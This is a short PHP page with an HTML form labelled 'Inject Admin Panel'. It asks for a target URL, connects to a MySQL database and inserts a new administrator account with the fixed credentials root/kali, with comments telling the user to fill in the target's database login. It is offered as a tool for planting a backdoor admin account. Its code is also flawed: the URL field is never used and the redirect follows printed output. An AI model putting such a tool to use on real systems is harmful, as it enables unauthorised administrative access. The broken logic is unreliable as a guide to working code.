<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $target_url = $_POST['target_url'];
    
    // Define the SQL to create the admins table
    $create_table_sql = "
    CREATE TABLE IF NOT EXISTS `admins` (
        `id` int(11) NOT NULL AUTO_INCREMENT,
        `username` varchar(50) NOT NULL,
        `password` varchar(255) NOT NULL,
        PRIMARY KEY (`id`)
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8;
    ";

    // Define the SQL to insert the admin credentials
    $insert_admin_sql = "
    INSERT INTO `admins` (username, password) VALUES ('root', 'kali');
    ";

    // Connect to the target database and inject the SQL
    $db_host = 'localhost';
    $db_username = 'root'; // Change this to the target database username
    $db_password = ''; // Change this to the target database password
    $db_name = 'admin_panel'; // Change this to the target database name

    $conn = new mysqli($db_host, $db_username, $db_password, $db_name);

    if ($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
    }

    if ($conn->query($create_table_sql) === TRUE && $conn->query($insert_admin_sql) === TRUE) {
        echo "Admin panel and credentials injected successfully.";
    } else {
        echo "Error: " . $conn->error;
    }

    $conn->close();

    // Redirect to the login page after successful injection
    header("Location: login.php");
    exit();
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Inject Admin Panel</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #6a1b9a;
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #4a148c;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
            text-align: center;
        }
        input[type="text"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: none;
            border-radius: 5px;
        }
        button {
            padding: 10px 20px;
            background-color: #8e24aa;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background-color: #ab47bc;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Inject Admin Panel</h1>
        <form method="post" action="inject.php">
            <input type="text" name="target_url" placeholder="Enter target URL" required>
            <button type="submit">Inject</button>
        </form>
    </div>
</body>
</html>
